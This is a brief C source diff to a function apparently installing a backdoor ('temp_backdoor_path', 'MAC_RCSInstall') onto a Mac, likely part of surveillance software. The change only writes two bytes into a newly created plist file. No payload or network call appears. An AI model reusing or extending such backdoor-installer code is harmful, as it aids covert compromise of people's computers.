@@ -111,7 +111,7 @@ BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 	WCHAR tmp_path2[MAX_PATH*2];
 	HANDLE hFind, hfile;
 	WIN32_FIND_DATA file_info;
-	DWORD w_len;
+	DWORD w_len, dummy;
 
 	WCHAR temp_backdoor_path[MAX_PATH];
 	WCHAR plist_path[MAX_PATH];
@@ -148,6 +148,7 @@ BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 	hfile = CreateFile(plist_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE)
 		return FALSE;
+	WriteFile(hfile, "00", 2, &dummy, NULL);
 	CloseHandle(hfile);
 
 	// Copia i file nella directory temporanea
